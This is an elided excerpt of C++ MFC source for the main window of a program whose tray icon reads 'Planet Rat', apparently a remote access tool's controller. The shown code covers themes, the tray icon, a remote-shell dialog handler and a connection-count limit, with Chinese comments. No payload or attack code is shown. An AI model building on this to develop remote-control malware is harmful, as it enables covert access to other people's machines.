...
BEGIN_MESSAGE_MAP(CMainFrame, CFrameWnd)
	...
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenshelldialog)							//终端管理系统
...
CMainFrame::CMainFrame()
{
	...
	str_log_Path = str_path + _T("\\日志记录.exe");
	DWORD dwTemp = 0;
...
int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
{
	...
	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2015);  //状态栏样式
	m_paneManager.InstallDockingPanes(this);
	XTPPaintManager()->RefreshMetrics();
	m_paneManager.SetTheme(xtpPaneThemeWinExplorer); // 设置下列功能分组主题xtpPaneThemeWinExplorer xtpPaneThemeWinNative xtpPaneThemeVisualStudio2005Beta2
	...
	CXTPPaintManager::SetTheme(xtpThemeVisualStudio2015);  //状态栏颜色样式
	...
	// 创建托盘图标
	if (!m_TrayIcon.Create(_T("Planet Rat"), // 提示文本
		this,                       // 父窗口
...
CDialogBar* CMainFrame::CreatewndFilterEdit()
{
	...
	m_wndFilterEdit->SetWindowText(_T("关键字搜索"));
...
BOOL CMainFrame::PreCreateWindow(CREATESTRUCT& cs)
{
    ...
    //int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    //int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    //cs.cx = screenWidth * 3 / 5;
    //cs.cy = screenHeight * 3 / 5;
...
void CMainFrame::OnSysCommand(UINT nID, LPARAM lParam)
{
	...
	{
	    //ShowWindow(SW_HIDE);
	    if (AfxMessageBox(_T("最小化到托盘?"), MB_YESNO | MB_ICONQUESTION) == IDYES){
            ShowWindow(SW_HIDE);
        }else{
            CMainFrame::OnClose();
        }
...
LRESULT CMainFrame::OnOpenDestopPopup(WPARAM wParam, LPARAM lParam)
{
	...
	pPopup->SetTheme(xtpPopupThemeMSN);   //弹出控件主题
...
void CMainFrame::ShowConnects()
{
	...
	m_wndStatusBar.SetPaneText(11, str);
	if (a > ONLINE_NUM)
	{
		g_pSocketBase->Shutdown();
	}
